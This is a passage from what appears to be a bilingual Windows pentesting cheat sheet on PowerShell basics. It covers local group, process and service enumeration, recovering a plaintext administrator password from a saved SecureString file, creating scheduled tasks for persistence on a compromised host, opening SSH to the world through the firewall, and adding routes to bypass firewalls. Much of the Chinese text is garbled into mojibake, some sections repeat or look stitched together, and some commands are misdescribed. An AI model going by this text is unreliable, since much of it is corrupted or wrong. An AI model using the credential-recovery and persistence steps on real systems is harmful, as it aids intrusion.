User groups are a fundamental aspect of Windows security. They are used to organize and manage user accounts, as well as to assign permissions and access rights to resources.

### Built-in Groups

Windows comes with several built-in groups that have predefined permissions and access rights. These groups include:

- Administrators: This group has full control over the system and can perform any administrative task.
- Users: This group includes all standard user accounts.
- Guests: This group is intended for temporary or guest accounts with limited privileges.
- Power Users: This group has some administrative privileges but is restricted from performing certain tasks.
- Backup Operators: Members of this group can perform backup and restore operations on the system.
- Remote Desktop Users: This group is granted permission to access the system remotely using Remote Desktop.
- Network Configuration Operators: Members of this group can manage network configuration settings.
- Print Operators: Members of this group can manage printers and print queues.
- Event Log Readers: Members of this group can read event logs.

### Creating and Managing Groups

In addition to the built-in groups, you can also create your own custom groups to suit your specific needs. To create a group, you can use the `New-LocalGroup` cmdlet in PowerShell.

```powershell
New-LocalGroup -Name "MyGroup" -Description "This is my custom group"
```

To manage group membership, you can use the `Add-LocalGroupMember` and `Remove-LocalGroupMember` cmdlets.

```powershell
Add-LocalGroupMember -Group "MyGroup" -Member "User1"
Remove-LocalGroupMember -Group "MyGroup" -Member "User2"
```

### Group Policy

Group Policy is a powerful tool that allows you to manage and enforce security settings across multiple systems in a domain. It can be used to configure group membership, permissions, and other security-related settings.

To configure Group Policy, you can use the `gpedit.msc` command to open the Group Policy Editor. From there, you can navigate to the desired policy settings and make the necessary changes.

### Conclusion

Understanding and effectively managing user groups is essential for maintaining a secure Windows environment. By properly assigning permissions and access rights, you can ensure that users have the appropriate level of access to resources while minimizing the risk of unauthorized access.
```powershell
Get-LocalGroup | ft Name #All groups
Get-LocalGroupMember Administrators | ft Name, PrincipalSource #Members of Administrators
```
## å‰ªè´´æ¿

The clipboard is a temporary storage area in the computer's memory that allows you to copy and paste text, images, and other data between different applications or within the same application. It is a useful feature that simplifies the process of transferring information.

In PowerShell, you can interact with the clipboard using the `Get-Clipboard` and `Set-Clipboard` cmdlets. 

The `Get-Clipboard` cmdlet retrieves the contents of the clipboard and outputs it to the console. You can also assign the output to a variable for further processing.

The `Set-Clipboard` cmdlet allows you to set the contents of the clipboard with a specified value. This value can be a string, an object, or the output of a command.

Here are some examples of how you can use these cmdlets:

- To retrieve the contents of the clipboard and display them in the console:
```powershell
Get-Clipboard
```

- To assign the contents of the clipboard to a variable:
```powershell
$clipboardContent = Get-Clipboard
```

- To set the contents of the clipboard with a string:
```powershell
Set-Clipboard -Value "Hello, world!"
```

- To set the contents of the clipboard with the output of a command:
```powershell
Get-Process | Set-Clipboard
```

Remember that the clipboard is a temporary storage area, and its contents are lost when you restart your computer or copy new data to it.
```powershell
Get-Clipboard
```
## è¿›ç¨‹

Processes are running instances of programs on a computer. In Windows, processes can be managed and manipulated using PowerShell commands. Here are some basic PowerShell commands for working with processes:

### Get-Process

The `Get-Process` command is used to retrieve information about running processes on a Windows system. It provides details such as the process ID (PID), name, CPU usage, and memory usage.

```powershell
Get-Process
```

### Start-Process

The `Start-Process` command is used to start a new process. It can be used to launch applications or execute scripts.

```powershell
Start-Process -FilePath "C:\path\to\application.exe"
```

### Stop-Process

The `Stop-Process` command is used to terminate a running process. It requires the process ID (PID) as input.

```powershell
Stop-Process -ID 1234
```

### Wait-Process

The `Wait-Process` command is used to wait for a process to exit before continuing with the script. It requires the process ID (PID) as input.

```powershell
Wait-Process -ID 1234
```

### Invoke-Command

The `Invoke-Command` command is used to run commands on remote computers. It can be used to manage processes on remote systems.

```powershell
Invoke-Command -ComputerName "RemoteComputer" -ScriptBlock { Get-Process }
```

These are just a few examples of the PowerShell commands that can be used to manage processes. PowerShell provides a wide range of commands and options for working with processes, allowing for advanced process manipulation and automation.
```powershell
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
## æœåŠ¡

### PowerShell Remoting

PowerShell Remoting å…è®¸åœ¨è¿œç¨‹ç³»ç»Ÿä¸Šæ‰§è¡Œ PowerShell å‘½ä»¤ã€‚å®ƒå¯ä»¥ç”¨äºåœ¨è¿œç¨‹ç³»ç»Ÿä¸Šæ‰§è¡Œå‘½ä»¤ã€è·å–è¿œç¨‹ç³»ç»Ÿçš„ä¿¡æ¯ä»¥åŠåœ¨è¿œç¨‹ç³»ç»Ÿä¸Šéƒ¨ç½²è„šæœ¬ã€‚

#### å¯ç”¨ PowerShell Remoting

è¦å¯ç”¨ PowerShell Remotingï¼Œéœ€è¦åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š

```powershell
Enable-PSRemoting -Force
```

#### è¿æ¥åˆ°è¿œç¨‹ç³»ç»Ÿ

è¦è¿æ¥åˆ°è¿œç¨‹ç³»ç»Ÿï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

```powershell
Enter-PSSession -ComputerName <è¿œç¨‹ç³»ç»Ÿçš„åç§°æˆ– IP åœ°å€> -Credential <å‡­æ®>
```

#### åœ¨è¿œç¨‹ç³»ç»Ÿä¸Šæ‰§è¡Œå‘½ä»¤

è¦åœ¨è¿œç¨‹ç³»ç»Ÿä¸Šæ‰§è¡Œå‘½ä»¤ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

```powershell
Invoke-Command -ComputerName <è¿œç¨‹ç³»ç»Ÿçš„åç§°æˆ– IP åœ°å€> -ScriptBlock { <è¦æ‰§è¡Œçš„å‘½ä»¤> }
```

### Windows Service Hardening

Windows æœåŠ¡ç¡¬åŒ–æ˜¯ä¸€ç§é€šè¿‡é…ç½®å’Œé™åˆ¶ Windows æœåŠ¡çš„è¡Œä¸ºæ¥å¢å¼ºç³»ç»Ÿå®‰å…¨æ€§çš„æ–¹æ³•ã€‚

#### ç¦ç”¨ä¸å¿…è¦çš„æœåŠ¡

ç¦ç”¨ä¸å¿…è¦çš„æœåŠ¡å¯ä»¥å‡å°‘ç³»ç»Ÿçš„æ”»å‡»é¢ã€‚å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥ç¦ç”¨æœåŠ¡ï¼š

```powershell
Set-Service -Name <æœåŠ¡åç§°> -StartupType Disabled
```

#### é…ç½®æœåŠ¡å¯åŠ¨ç±»å‹

é…ç½®æœåŠ¡çš„å¯åŠ¨ç±»å‹å¯ä»¥é™åˆ¶æœåŠ¡çš„å¯åŠ¨æ–¹å¼ã€‚å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥é…ç½®æœåŠ¡çš„å¯åŠ¨ç±»å‹ï¼š

```powershell
Set-Service -Name <æœåŠ¡åç§°> -StartupType <å¯åŠ¨ç±»å‹>
```

å…¶ä¸­ï¼Œå¯åŠ¨ç±»å‹å¯ä»¥æ˜¯ä»¥ä¸‹ä¹‹ä¸€ï¼š

- Automaticï¼šæœåŠ¡å°†åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶è‡ªåŠ¨å¯åŠ¨ã€‚
- Manualï¼šæœåŠ¡éœ€è¦æ‰‹åŠ¨å¯åŠ¨ã€‚
- Disabledï¼šæœåŠ¡è¢«ç¦ç”¨ï¼Œæ— æ³•å¯åŠ¨ã€‚

#### é™åˆ¶æœåŠ¡çš„æƒé™

é™åˆ¶æœåŠ¡çš„æƒé™å¯ä»¥é˜²æ­¢æœåŠ¡æ»¥ç”¨ç³»ç»Ÿæƒé™ã€‚å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥é™åˆ¶æœåŠ¡çš„æƒé™ï¼š

```powershell
Set-Service -Name <æœåŠ¡åç§°> -RequiredPrivileges <æƒé™åˆ—è¡¨>
```

å…¶ä¸­ï¼Œæƒé™åˆ—è¡¨æ˜¯ä¸€ä¸ªä»¥é€—å·åˆ†éš”çš„æƒé™åç§°åˆ—è¡¨ã€‚

#### ç›‘è§†æœåŠ¡çŠ¶æ€

ç›‘è§†æœåŠ¡çŠ¶æ€å¯ä»¥åŠæ—¶å‘ç°å¼‚å¸¸è¡Œä¸ºã€‚å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥ç›‘è§†æœåŠ¡çŠ¶æ€ï¼š

```powershell
Get-Service -Name <æœåŠ¡åç§°>
```

### Windows Firewall

Windows é˜²ç«å¢™æ˜¯ä¸€ç§ç”¨äºä¿æŠ¤ç³»ç»Ÿå…å—ç½‘ç»œæ”»å‡»çš„è½¯ä»¶é˜²ç«å¢™ã€‚

#### å¯ç”¨ Windows é˜²ç«å¢™

è¦å¯ç”¨ Windows é˜²ç«å¢™ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

```powershell
Set-NetFirewallProfile -Profile <é…ç½®æ–‡ä»¶åç§°> -Enabled True
```

å…¶ä¸­ï¼Œé…ç½®æ–‡ä»¶åç§°å¯ä»¥æ˜¯ä»¥ä¸‹ä¹‹ä¸€ï¼š

- Domainï¼šåŸŸç½‘ç»œé…ç½®æ–‡ä»¶ã€‚
- Privateï¼šä¸“ç”¨ç½‘ç»œé…ç½®æ–‡ä»¶ã€‚
- Publicï¼šå…¬å…±ç½‘ç»œé…ç½®æ–‡ä»¶ã€‚

#### é…ç½®é˜²ç«å¢™è§„åˆ™

é…ç½®é˜²ç«å¢™è§„åˆ™å¯ä»¥é™åˆ¶è¿›å‡ºç³»ç»Ÿçš„ç½‘ç»œæµé‡ã€‚å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥é…ç½®é˜²ç«å¢™è§„åˆ™ï¼š

```powershell
New-NetFirewallRule -DisplayName <è§„åˆ™åç§°> -Direction <æµé‡æ–¹å‘> -Action <åŠ¨ä½œ> -Protocol <åè®®> -LocalPort <æœ¬åœ°ç«¯å£> -RemoteAddress <è¿œç¨‹åœ°å€> -Enabled True
```

å…¶ä¸­ï¼Œæµé‡æ–¹å‘å¯ä»¥æ˜¯ä»¥ä¸‹ä¹‹ä¸€ï¼š

- Inboundï¼šè¿›å…¥ç³»ç»Ÿçš„æµé‡ã€‚
- Outboundï¼šç¦»å¼€ç³»ç»Ÿçš„æµé‡ã€‚

åŠ¨ä½œå¯ä»¥æ˜¯ä»¥ä¸‹ä¹‹ä¸€ï¼š

- Allowï¼šå…è®¸æµé‡é€šè¿‡ã€‚
- Blockï¼šé˜»æ­¢æµé‡ã€‚

åè®®å¯ä»¥æ˜¯ä»¥ä¸‹ä¹‹ä¸€ï¼š

- TCPï¼šä¼ è¾“æ§åˆ¶åè®®ã€‚
- UDPï¼šç”¨æˆ·æ•°æ®æŠ¥åè®®ã€‚

æœ¬åœ°ç«¯å£å’Œè¿œç¨‹åœ°å€å¯ä»¥æ˜¯å…·ä½“çš„ç«¯å£å·å’Œ IP åœ°å€ï¼Œä¹Ÿå¯ä»¥æ˜¯é€šé…ç¬¦ã€‚

#### ç›‘è§†é˜²ç«å¢™çŠ¶æ€

ç›‘è§†é˜²ç«å¢™çŠ¶æ€å¯ä»¥åŠæ—¶å‘ç°å¼‚å¸¸ç½‘ç»œæµé‡ã€‚å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥ç›‘è§†é˜²ç«å¢™çŠ¶æ€ï¼š

```powershell
Get-NetFirewallProfile -Profile <é…ç½®æ–‡ä»¶åç§°>
```
```
Get-Service
```
## ä»å®‰å…¨å­—ç¬¦ä¸²ä¸­è·å–å¯†ç 

åœ¨è¿›è¡Œæ¸—é€æµ‹è¯•æ—¶ï¼Œæˆ‘ä»¬ç»å¸¸éœ€è¦ä»å®‰å…¨å­—ç¬¦ä¸²ä¸­è·å–å¯†ç ã€‚å®‰å…¨å­—ç¬¦ä¸²æ˜¯ä¸€ç§åŠ å¯†çš„å½¢å¼ï¼Œç”¨äºå­˜å‚¨æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚å¯†ç ã€‚åœ¨Windowsä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨PowerShellæ¥æå–å®‰å…¨å­—ç¬¦ä¸²ä¸­çš„å¯†ç ã€‚

ä»¥ä¸‹æ˜¯ä»å®‰å…¨å­—ç¬¦ä¸²ä¸­è·å–å¯†ç çš„æ­¥éª¤ï¼š

1. æ‰“å¼€PowerShellæ§åˆ¶å°ã€‚
2. ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å°†å®‰å…¨å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ™®é€šå­—ç¬¦ä¸²ï¼š

```powershell
$secureString = ConvertTo-SecureString -String "å®‰å…¨å­—ç¬¦ä¸²" -AsPlainText -Force
```

3. ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å°†å®‰å…¨å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ˜æ–‡å¯†ç ï¼š

```powershell
$plainTextPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString))
```

ç°åœ¨ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨`$plainTextPassword`å˜é‡æ¥è®¿é—®ä»å®‰å…¨å­—ç¬¦ä¸²ä¸­æå–çš„å¯†ç ã€‚

è¯·æ³¨æ„ï¼Œä»å®‰å…¨å­—ç¬¦ä¸²ä¸­æå–å¯†ç å¯èƒ½ä¼šå¯¼è‡´å®‰å…¨é£é™©ï¼Œå› ä¸ºå¯†ç å°†ä»¥æ˜æ–‡å½¢å¼å­˜å‚¨åœ¨å†…å­˜ä¸­ã€‚å› æ­¤ï¼Œåœ¨ä½¿ç”¨å®Œå¯†ç åï¼Œè¯·åŠ¡å¿…å°†å…¶ä»å†…å­˜ä¸­æ¸…é™¤ã€‚

è¿™æ˜¯ä»å®‰å…¨å­—ç¬¦ä¸²ä¸­è·å–å¯†ç çš„åŸºæœ¬æ–¹æ³•ã€‚åœ¨å®é™…æ¸—é€æµ‹è¯•ä¸­ï¼Œæ‚¨å¯èƒ½éœ€è¦ä½¿ç”¨å…¶ä»–æŠ€æœ¯å’Œå·¥å…·æ¥è·å–å¯†ç ã€‚
```powershell
$pw=gc admin-pass.xml | convertto-securestring #Get the securestring from the file
$cred=new-object system.management.automation.pscredential("administrator", $pw)
$cred.getnetworkcredential() | fl * #Get plaintext password
```
## å®šæ—¶ä»»åŠ¡

Scheduled tasks are a powerful feature in Windows that allow you to automate the execution of scripts or programs at specific times or intervals. As a pentester, understanding how to manipulate and exploit scheduled tasks can be extremely valuable.

å®šæ—¶ä»»åŠ¡æ˜¯Windowsä¸­çš„ä¸€ä¸ªå¼ºå¤§åŠŸèƒ½ï¼Œå®ƒå…è®¸æ‚¨åœ¨ç‰¹å®šæ—¶é—´æˆ–é—´éš”å†…è‡ªåŠ¨æ‰§è¡Œè„šæœ¬æˆ–ç¨‹åºã€‚ä½œä¸ºä¸€åæ¸—é€æµ‹è¯•äººå‘˜ï¼Œäº†è§£å¦‚ä½•æ“ä½œå’Œåˆ©ç”¨å®šæ—¶ä»»åŠ¡å¯ä»¥éå¸¸æœ‰ä»·å€¼ã€‚

### Viewing Scheduled Tasks

### æŸ¥çœ‹å®šæ—¶ä»»åŠ¡

To view the list of scheduled tasks on a Windows system, you can use the `schtasks` command. This command provides a detailed overview of all the scheduled tasks, including their names, triggers, and actions.

è¦æŸ¥çœ‹Windowsç³»ç»Ÿä¸Šçš„å®šæ—¶ä»»åŠ¡åˆ—è¡¨ï¼Œå¯ä»¥ä½¿ç”¨`schtasks`å‘½ä»¤ã€‚è¯¥å‘½ä»¤æä¾›äº†æ‰€æœ‰å®šæ—¶ä»»åŠ¡çš„è¯¦ç»†æ¦‚è¿°ï¼ŒåŒ…æ‹¬å®ƒä»¬çš„åç§°ã€è§¦å‘å™¨å’Œæ“ä½œã€‚

```plaintext
schtasks /query /fo LIST /v
```

### Creating Scheduled Tasks

### åˆ›å»ºå®šæ—¶ä»»åŠ¡

As a pentester, you may want to create a scheduled task to maintain persistence on a compromised system. To create a scheduled task, you can use the `schtasks` command with the `/create` option. You will need administrative privileges to create a scheduled task.

ä½œä¸ºä¸€åæ¸—é€æµ‹è¯•äººå‘˜ï¼Œæ‚¨å¯èƒ½å¸Œæœ›åœ¨è¢«å…¥ä¾µçš„ç³»ç»Ÿä¸Šåˆ›å»ºä¸€ä¸ªå®šæ—¶ä»»åŠ¡ä»¥ä¿æŒæŒä¹…æ€§ã€‚è¦åˆ›å»ºå®šæ—¶ä»»åŠ¡ï¼Œå¯ä»¥ä½¿ç”¨å¸¦æœ‰`/create`é€‰é¡¹çš„`schtasks`å‘½ä»¤ã€‚æ‚¨éœ€è¦ç®¡ç†å‘˜æƒé™æ‰èƒ½åˆ›å»ºå®šæ—¶ä»»åŠ¡ã€‚

```plaintext
schtasks /create /sc <schedule> /tn <task_name> /tr <command> /ru <username> /rp <password>
```

- `<schedule>`: Specifies the schedule for the task (e.g., `MINUTE`, `HOURLY`, `DAILY`, `WEEKLY`, `MONTHLY`).
- `<task_name>`: Specifies the name of the task.
- `<command>`: Specifies the command or script to be executed.
- `<username>`: Specifies the username under which the task will run.
- `<password>`: Specifies the password for the specified username.

- `<schedule>`: æŒ‡å®šä»»åŠ¡çš„è®¡åˆ’ï¼ˆä¾‹å¦‚ï¼Œ`MINUTE`ï¼Œ`HOURLY`ï¼Œ`DAILY`ï¼Œ`WEEKLY`ï¼Œ`MONTHLY`ï¼‰ã€‚
- `<task_name>`: æŒ‡å®šä»»åŠ¡çš„åç§°ã€‚
- `<command>`: æŒ‡å®šè¦æ‰§è¡Œçš„å‘½ä»¤æˆ–è„šæœ¬ã€‚
- `<username>`: æŒ‡å®šä»»åŠ¡å°†åœ¨å…¶ä¸‹è¿è¡Œçš„ç”¨æˆ·åã€‚
- `<password>`: æŒ‡å®šæŒ‡å®šç”¨æˆ·åçš„å¯†ç ã€‚

### Modifying Scheduled Tasks

### ä¿®æ”¹å®šæ—¶ä»»åŠ¡

To modify an existing scheduled task, you can use the `schtasks` command with the `/change` option. This allows you to update the schedule, command, or other properties of the task.

è¦ä¿®æ”¹ç°æœ‰çš„å®šæ—¶ä»»åŠ¡ï¼Œå¯ä»¥ä½¿ç”¨å¸¦æœ‰`/change`é€‰é¡¹çš„`schtasks`å‘½ä»¤ã€‚è¿™æ ·å¯ä»¥æ›´æ–°ä»»åŠ¡çš„è®¡åˆ’ã€å‘½ä»¤æˆ–å…¶ä»–å±æ€§ã€‚

```plaintext
schtasks /change /tn <task_name> /tr <new_command>
```

- `<task_name>`: Specifies the name of the task to be modified.
- `<new_command>`: Specifies the new command or script to be executed.

- `<task_name>`: æŒ‡å®šè¦ä¿®æ”¹çš„ä»»åŠ¡çš„åç§°ã€‚
- `<new_command>`: æŒ‡å®šè¦æ‰§è¡Œçš„æ–°å‘½ä»¤æˆ–è„šæœ¬ã€‚

### Deleting Scheduled Tasks

### åˆ é™¤å®šæ—¶ä»»åŠ¡

To delete a scheduled task, you can use the `schtasks` command with the `/delete` option.

è¦åˆ é™¤å®šæ—¶ä»»åŠ¡ï¼Œå¯ä»¥ä½¿ç”¨å¸¦æœ‰`/delete`é€‰é¡¹çš„`schtasks`å‘½ä»¤ã€‚

```plaintext
schtasks /delete /tn <task_name> /f
```

- `<task_name>`: Specifies the name of the task to be deleted.
- `/f`: Forces the deletion of the task without confirmation.

- `<task_name>`: æŒ‡å®šè¦åˆ é™¤çš„ä»»åŠ¡çš„åç§°ã€‚
- `/f`: å¼ºåˆ¶åˆ é™¤ä»»åŠ¡ï¼Œæ— éœ€ç¡®è®¤ã€‚

### Disabling Scheduled Tasks

### ç¦ç”¨å®šæ—¶ä»»åŠ¡

To disable a scheduled task, you can use the `schtasks` command with the `/change` option and set the `/disable` flag.

è¦ç¦ç”¨å®šæ—¶ä»»åŠ¡ï¼Œå¯ä»¥ä½¿ç”¨å¸¦æœ‰`/change`é€‰é¡¹çš„`schtasks`å‘½ä»¤ï¼Œå¹¶è®¾ç½®`/disable`æ ‡å¿—ã€‚

```plaintext
schtasks /change /tn <task_name> /disable
```

- `<task_name>`: Specifies the name of the task to be disabled.

- `<task_name>`: æŒ‡å®šè¦ç¦ç”¨çš„ä»»åŠ¡çš„åç§°ã€‚

### Enabling Scheduled Tasks

### å¯ç”¨å®šæ—¶ä»»åŠ¡

To enable a disabled scheduled task, you can use the `schtasks` command with the `/change` option and set the `/enable` flag.

è¦å¯ç”¨å·²ç¦ç”¨çš„å®šæ—¶ä»»åŠ¡ï¼Œå¯ä»¥ä½¿ç”¨å¸¦æœ‰`/change`é€‰é¡¹çš„`schtasks`å‘½ä»¤ï¼Œå¹¶è®¾ç½®`/enable`æ ‡å¿—ã€‚

```plaintext
schtasks /change /tn <task_name> /enable
```

- `<task_name>`: Specifies the name of the task to be enabled.

- `<task_name>`: æŒ‡å®šè¦å¯ç”¨çš„ä»»åŠ¡çš„åç§°ã€‚
```powershell
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```
## ç½‘ç»œ

### æ¥å£

#### PowerShellå‘½ä»¤

```powershell
Get-NetAdapter
```

æ­¤å‘½ä»¤ç”¨äºè·å–ç³»ç»Ÿä¸Šçš„æ‰€æœ‰ç½‘ç»œé€‚é…å™¨çš„è¯¦ç»†ä¿¡æ¯ã€‚

#### è¾“å‡ºç¤ºä¾‹

```plaintext
Name                      InterfaceDescription                    ifIndex Status       MacAddress             LinkSpeed
----                      --------------------                    ------- ------       ----------             ---------
Ethernet                  Intel(R) Ethernet Connection (2) I219-V      12 Up           00-11-22-33-44-55       1 Gbps
Wi-Fi                     Intel(R) Dual Band Wireless-AC 8265          13 Up           66-77-88-99-AA-BB       300 Mbps
```

#### è§£é‡Š

- `Name`ï¼šé€‚é…å™¨çš„åç§°ã€‚
- `InterfaceDescription`ï¼šé€‚é…å™¨çš„æè¿°ã€‚
- `ifIndex`ï¼šé€‚é…å™¨çš„ç´¢å¼•ã€‚
- `Status`ï¼šé€‚é…å™¨çš„çŠ¶æ€ã€‚
- `MacAddress`ï¼šé€‚é…å™¨çš„ç‰©ç†åœ°å€ã€‚
- `LinkSpeed`ï¼šé€‚é…å™¨çš„é“¾æ¥é€Ÿåº¦ã€‚
```powershell
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### é˜²ç«å¢™

A firewall is a network security device that monitors and controls incoming and outgoing network traffic based on predetermined security rules. It acts as a barrier between a trusted internal network and an untrusted external network, such as the internet. Firewalls can be implemented as hardware devices or software programs.

é˜²ç«å¢™æ˜¯ä¸€ç§ç½‘ç»œå®‰å…¨è®¾å¤‡ï¼Œæ ¹æ®é¢„å®šçš„å®‰å…¨è§„åˆ™ç›‘æ§å’Œæ§åˆ¶è¿›å‡ºç½‘ç»œçš„æµé‡ã€‚å®ƒå……å½“å¯ä¿¡ä»»çš„å†…éƒ¨ç½‘ç»œå’Œä¸å¯ä¿¡ä»»çš„å¤–éƒ¨ç½‘ç»œï¼ˆå¦‚äº’è”ç½‘ï¼‰ä¹‹é—´çš„å±éšœã€‚é˜²ç«å¢™å¯ä»¥ä½œä¸ºç¡¬ä»¶è®¾å¤‡æˆ–è½¯ä»¶ç¨‹åºå®ç°ã€‚

Firewalls can be configured to allow or block specific types of traffic based on various criteria, such as source IP address, destination IP address, port number, and protocol. They help protect networks from unauthorized access, malicious attacks, and data breaches.

é˜²ç«å¢™å¯ä»¥æ ¹æ®å„ç§æ ‡å‡†ï¼ˆå¦‚æºIPåœ°å€ã€ç›®æ ‡IPåœ°å€ã€ç«¯å£å·å’Œåè®®ï¼‰é…ç½®å…è®¸æˆ–é˜»æ­¢ç‰¹å®šç±»å‹çš„æµé‡ã€‚å®ƒä»¬æœ‰åŠ©äºä¿æŠ¤ç½‘ç»œå…å—æœªç»æˆæƒçš„è®¿é—®ã€æ¶æ„æ”»å‡»å’Œæ•°æ®æ³„éœ²çš„å½±å“ã€‚

Firewalls are an essential component of network security and are commonly used in both home and enterprise environments. They provide an additional layer of defense by filtering and inspecting network traffic to ensure that only legitimate and authorized traffic is allowed to pass through.

é˜²ç«å¢™æ˜¯ç½‘ç»œå®‰å…¨çš„é‡è¦ç»„æˆéƒ¨åˆ†ï¼Œå¹¿æ³›åº”ç”¨äºå®¶åº­å’Œä¼ä¸šç¯å¢ƒã€‚å®ƒä»¬é€šè¿‡è¿‡æ»¤å’Œæ£€æŸ¥ç½‘ç»œæµé‡ï¼Œæä¾›äº†é¢å¤–çš„é˜²å¾¡å±‚ï¼Œä»¥ç¡®ä¿åªæœ‰åˆæ³•å’Œæˆæƒçš„æµé‡è¢«å…è®¸é€šè¿‡ã€‚

In addition to traditional firewalls, there are also host-based firewalls that are installed on individual computers or servers. These firewalls provide an added layer of protection by controlling network traffic at the host level.

é™¤äº†ä¼ ç»Ÿçš„é˜²ç«å¢™å¤–ï¼Œè¿˜æœ‰å®‰è£…åœ¨ä¸ªäººè®¡ç®—æœºæˆ–æœåŠ¡å™¨ä¸Šçš„ä¸»æœºé˜²ç«å¢™ã€‚è¿™äº›é˜²ç«å¢™é€šè¿‡åœ¨ä¸»æœºçº§åˆ«æ§åˆ¶ç½‘ç»œæµé‡ï¼Œæä¾›äº†é¢å¤–çš„ä¿æŠ¤å±‚ã€‚

It is important to properly configure and maintain firewalls to ensure their effectiveness. Regularly updating firewall rules, monitoring logs for suspicious activity, and conducting periodic security audits are essential practices for maintaining a secure network environment.

æ­£ç¡®é…ç½®å’Œç»´æŠ¤é˜²ç«å¢™éå¸¸é‡è¦ï¼Œä»¥ç¡®ä¿å…¶æœ‰æ•ˆæ€§ã€‚å®šæœŸæ›´æ–°é˜²ç«å¢™è§„åˆ™ã€ç›‘æ§æ—¥å¿—ä»¥å¯»æ‰¾å¯ç–‘æ´»åŠ¨ï¼Œå¹¶è¿›è¡Œå®šæœŸå®‰å…¨å®¡è®¡æ˜¯ç»´æŠ¤å®‰å…¨ç½‘ç»œç¯å¢ƒçš„é‡è¦å®è·µã€‚
```powershell
Get-NetFirewallRule -Enabled True

Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block
Get-NetFirewallRule -Direction Outbound -Enabled True -Action Allow
Get-NetFirewallRule -Direction Inbound -Enabled True -Action Block
Get-NetFirewallRule -Direction Inbound -Enabled True -Action Allow

# Open SSH to the world
New-NetFirewallRule -DisplayName 'SSH (Port 22)' -Direction Inbound -LocalPort 22 -Protocol TCP -Action Allow

# Get name, proto, local and rremote ports, remote address, penable,profile and direction
## You can user the following line changing the initial filters to indicat a difefrent direction or action
Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table -Property  DisplayName, @{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}}, @{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}},Profile,Direction,Action
```
### è·¯ç”±

Routes are a fundamental concept in network communication. They determine how data packets are forwarded from one network to another. In the context of pentesting, understanding and manipulating routes can be crucial for gaining access to target systems.

#### Default Route

The default route, also known as the gateway of last resort, is the route that is used when there is no specific route available for a destination network. It is typically set to the IP address of the next-hop router that can forward packets to other networks.

To view the default route in Windows, you can use the `route print` command in PowerShell. This will display the routing table, which includes the default route information.

```powershell
route print
```

#### Adding Routes

As a pentester, you may need to add routes to redirect traffic through specific paths. This can be useful for bypassing firewalls or routing traffic through compromised systems.

To add a route in Windows using PowerShell, you can use the `New-NetRoute` cmdlet. Here is an example of adding a route to redirect traffic destined for the 10.10.10.0/24 network through the IP address 192.168.1.1:

```powershell
New-NetRoute -DestinationPrefix 10.10.10.0/24 -NextHop 192.168.1.1
```

#### Modifying Routes

In addition to adding routes, you may also need to modify existing routes. This can be done using the `Set-NetRoute` cmdlet in PowerShell.

For example, to change the next-hop IP address for a specific route, you can use the following command:

```powershell
Set-NetRoute -DestinationPrefix 10.10.10.0/24 -NextHop 192.168.2.1
```

#### Deleting Routes

To delete a route in Windows using PowerShell, you can use the `Remove-NetRoute` cmdlet. Here is an example of deleting a route for the 10.10.10.0/24 network:

```powershell
Remove-NetRoute -DestinationPrefix 10.10.10.0/24
```

#### Conclusion

Understanding and manipulating routes is an important skill for pentesters. By adding, modifying, or deleting routes, you can control the flow of network traffic and potentially gain access to target systems.
```powershell
route print
```
### ARP

ARPï¼ˆåœ°å€è§£æåè®®ï¼‰æ˜¯ä¸€ç§ç”¨äºå°†IPåœ°å€æ˜ å°„åˆ°ç‰©ç†MACåœ°å€çš„åè®®ã€‚åœ¨å±€åŸŸç½‘ä¸­ï¼ŒARPè¢«ç”¨äºç¡®å®šç›®æ ‡è®¾å¤‡çš„MACåœ°å€ï¼Œä»¥ä¾¿åœ¨æ•°æ®åŒ…ä¼ è¾“è¿‡ç¨‹ä¸­æ­£ç¡®åœ°å°†æ•°æ®åŒ…å‘é€åˆ°ç›®æ ‡è®¾å¤‡ã€‚

